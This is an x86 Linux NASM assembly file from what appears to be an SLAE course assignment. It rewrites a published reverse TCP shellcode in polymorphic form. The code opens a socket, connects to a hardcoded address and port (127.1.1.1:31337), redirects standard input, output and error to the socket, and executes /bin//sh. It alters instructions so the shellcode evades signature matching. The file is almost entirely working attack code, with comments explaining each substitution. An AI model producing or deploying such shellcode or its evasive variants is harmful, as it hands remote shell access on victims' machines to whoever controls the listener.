; Filename: reversetcpbindshell-polymorphic.nasm
; Author:  Alex
; SLAE-ID: SLAE-1046
; Website:  http://0xdeadcode.se
;
; Purpose: Assignment 6 - Create polymorphic variant of existing shellcode
; 	   http://shell-storm.org/shellcode/files/shellcode-849.php
;	   Only real difference is the IP	   

global _start			

section .text
_start:
	; xor eax, eax
	; xor ebx, ebx
	; xor ecx, ecx
	; xor edx, edx
	; sub reg, reg <-- works on most processors	
	sub eax, eax
	sub ebx, ebx
	sub ecx, ecx
	sub edx, edx

;	mov al, 0x66
	add al, 0x66
;	mov bl, 0x1
	inc bl		; bl = 1
	push ecx
;	push 0x6
;	push 0x1
;	push 0x2
	mov byte [esp-8], 0x2	; mov in different order, but on correct
	mov byte [esp], 0x6	; stack position 
	mov byte [esp-4], 0x1
	sub esp, 8		; fix stack pointer	
;	mov ecx, esp
	push esp
	pop ecx
	int 0x80
	mov esi, eax	; eax = 7
;	mov esi, 0x7
	mov al, 0x66
;	xor ebx, ebx	; bl = 1 here. 
;	mov bl, 0x2	; inc l instead of xor+mov
	inc bl

;	push 0x0101017f
	mov dword [esp], 0x0101017f
	sub esp, 8
	push word 0x697a
	push bx
;	inc bl		; bl prior to exec is 2
	add bl, 0x1	; bl = 3
	mov ecx, esp
	
	push 0x10
	push ecx
	push esi

;	mov ecx, esp
	push esp
	pop ecx
	int 0x80
;	xor ecx, ecx
	sub ecx, ecx
;	mov cl, 0x3
	pop ecx		; stack contains 2 (stderr) from last syscall

dupfd:
;	dec cl
;	mov al, 0x3f
	mov al, 0x3f	; switched order
	dec cl		;
	int 0x80
;	jne dupfd
	jns dupfd
;	xor eax, eax
	sub eax, eax
	push edx
	push 0x68732f6e
	push 0x69622f2f
;	mov ebx, esp
	push esp
	pop ebx
	push edx
	push ebx
;	mov ecx, esp
	push esp
	pop ecx
	push edx
;	mov edx, esp
	push esp
	pop edx
;	mov al, 0xb
	add al, 0xb

	int 0x80
 
